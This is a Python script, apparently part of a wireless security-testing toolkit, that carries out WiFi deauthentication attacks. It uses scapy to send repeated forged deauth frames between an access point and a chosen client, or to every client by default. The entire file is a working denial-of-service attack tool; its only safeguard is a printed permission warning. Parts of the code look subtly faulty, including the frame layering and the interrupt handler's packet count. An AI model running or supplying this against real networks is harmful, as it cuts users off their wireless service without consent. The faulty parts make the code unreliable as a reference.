#!/usr/bin/env python3
"""
WiFi Deauth Attack Module
Perform deauthentication attacks for security testing
"""

import os
import sys
import time
import signal

try:
    from scapy.all import Ether, Dot11, Dot11Deauth, sendp
except ImportError:
    print("Error: scapy not installed")
    sys.exit(1)

def send_deauth(interface, bssid, target_mac=None, count=10, interval=0.1):
    """Send deauth packets"""
    sent = 0
    
    # Target all if not specified
    target = target_mac if target_mac else "ff:ff:ff:ff:ff:ff"
    
    for i in range(count):
        # Deauth from AP to client
        packet1 = Ether(dst=target, src=bssid)/\
                  Dot11(addr1=target, addr2=bssid, addr3=bssid)/\
                  Dot11Deauth()
        
        # Deauth from client to AP
        packet2 = Ether(dst=bssid, src=target)/\
                  Dot11(addr1=bssid, addr2=target, addr3=target)/\
                  Dot11Deauth()
        
        try:
            sendp(packet1, iface=interface, verbose=False)
            sendp(packet2, iface=interface, verbose=False)
            sent += 2
        except:
            return sent
        
        if interval > 0:
            time.sleep(interval)
    
    return sent

def main():
    interface = os.getenv('ARG_INTERFACE')
    bssid = os.getenv('ARG_BSSID')
    target_mac = os.getenv('ARG_TARGET_MAC')
    count = int(os.getenv('ARG_COUNT', '100'))
    interval = float(os.getenv('ARG_INTERVAL', '0.1'))
    
    if not interface or not bssid:
        print("Error: interface and bssid required")
        sys.exit(1)
    
    print(f"[!] WARNING: Deauthentication attacks can disrupt network service")
    print(f"[!] Only use on networks you own or have permission to test")
    print(f"\n[*] WiFi Deauth Attack")
    print(f"[*] Interface: {interface}")
    print(f"[*] AP (BSSID): {bssid}")
    
    if target_mac:
        print(f"[*] Target Client: {target_mac}")
    else:
        print(f"[*] Target: All connected clients")
    
    print(f"[*] Packets: {count}, Interval: {interval}s")
    
    sent = 0
    start_time = time.time()
    
    def signal_handler(sig, frame):
        elapsed = time.time() - start_time
        print(f"\n[+] Sent {sent} deauth packets in {elapsed:.2f}s")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        print(f"\n[*] Sending deauth packets...")
        sent = send_deauth(interface, bssid, target_mac, count, interval)
        
        elapsed = time.time() - start_time
        print(f"\n[+] Complete! Sent {sent} packets in {elapsed:.2f}s")
    except PermissionError:
        print("Error: This requires root/administrator privileges")
        sys.exit(1)
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
